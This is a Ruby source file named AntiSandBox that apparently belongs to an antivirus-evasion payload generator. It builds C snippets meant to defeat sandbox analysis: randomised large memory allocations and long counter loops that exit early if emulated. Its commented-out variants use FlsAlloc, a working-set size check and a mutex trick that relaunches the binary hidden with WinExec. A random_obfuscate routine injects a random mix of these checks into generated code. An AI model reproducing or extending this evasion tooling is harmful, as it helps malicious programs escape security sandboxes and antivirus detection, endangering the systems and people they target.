#!/usr/bin/env ruby
# -*- coding: binary -*-
# Code by Green-m
# Test  on ruby 2.3.3

$LOAD_PATH.unshift(File.dirname(__FILE__))
require 'output'
require 'utils'

# return anti sandbox code 
module AntiSandBox

    def self.malloc_obfuscation
        memory_size = random_number(1000000..100000000)
        rand_name1 = random_funcname

        code =  "char * #{rand_name1} = NULL;\n"
        code << "#{rand_name1} = (char *) malloc(#{memory_size});\n"
        code << "if(#{rand_name1}==NULL){return 0;}\n"
        code << "memset(#{rand_name1},00,#{memory_size});\n"
        code << "free(#{rand_name1});\n"
    end

    def self.increment_obfuscation
        increment_times = random_number(100000000..1000000000)
        rand_name1 = random_funcname

        code =  "int #{rand_name1} = 0;\n"
        code << "for(int i =0; i < #{increment_times}; i ++)\n"
        code << "{#{rand_name1}++;}\n"
        code << "if(#{rand_name1} != #{increment_times}){return 0;}\n"
    end
=begin
    def self.fls_obfuscation
        rand_name1 = random_funcname

        code =  "DWORD #{rand_name1} = FlsAlloc(NULL);\n"
        code << "if (#{rand_name1} == FLS_OUT_OF_INDEXES){return 0;}\n"

    end
=end
=begin
    def self.memory_obfuscation
        rand_name1 = random_funcname
        memory_size = random_number(3500000..3600000)

        code =  "#include <psapi.h>\n"
        code << "PROCESS_MEMORY_COUNTERS #{rand_name1};\n"
        code << "GetProcessMemoryInfo(GetCurrentProcess(), &#{rand_name1}, sizeof(#{rand_name1}));\n"
        code << "if(#{rand_name1}.WorkingSetSize>#{memory_size}){return 0;}\n"

    end
=end
=begin
    def self.mutex_obfuscation
        rand_mutex = random_funcname
        rand_name1 = random_funcname
        rand_name2 = random_funcname

        code =  "char #{rand_name1}[MAX_PATH];\n"
        code << "GetModuleFileName(NULL, #{rand_name1}, MAX_PATH);\n"
        code << "HANDLE #{rand_name2};\n"
        code << %Q{#{rand_name2} = CreateMutex(NULL, TRUE, "#{rand_mutex}");\n}
        code << "if (GetLastError() != ERROR_ALREADY_EXISTS)\n"
        code << "{WinExec(#{rand_name1},SW_HIDE);\n"
        code << "Sleep(1000);\n"
        code << "return 0;}\n"

    end
=end
    def self.random_obfuscate
        obfuscate_code = ""
        obfuscate_funcs_all = []
        obfuscate_funcs = []

        self.methods.each{|x|
            obfuscate_funcs_all << x if x.to_s.include?'obfuscation'
        }

        random_number(0..obfuscate_funcs_all.length).times do 
            obfuscate_funcs << obfuscate_funcs_all.sample
        end
        obfuscate_funcs.uniq!

        obfuscate_funcs.each{|x|
            obfuscate_code << self.send(x)
        }
        obfuscate_code

    end

end